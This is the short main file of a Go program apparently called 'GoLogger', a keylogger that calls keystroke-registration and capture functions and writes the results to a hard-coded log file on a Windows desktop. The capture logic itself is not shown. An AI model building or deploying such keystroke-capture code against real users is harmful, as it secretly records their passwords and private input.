package main

import "os"

var FolderPath = "C:\\Users\\chuon\\Desktop\\GoWorkspace\\src\\github.com\\cdong1012\\GoLogger"
var LogFilePath = FolderPath + "\\log.txt"
var LogFileHandle *os.File

func main() {
	defer LogFileHandle.Close()
	registerKeystrokes()
	startCapturing(LogFilePath)
}
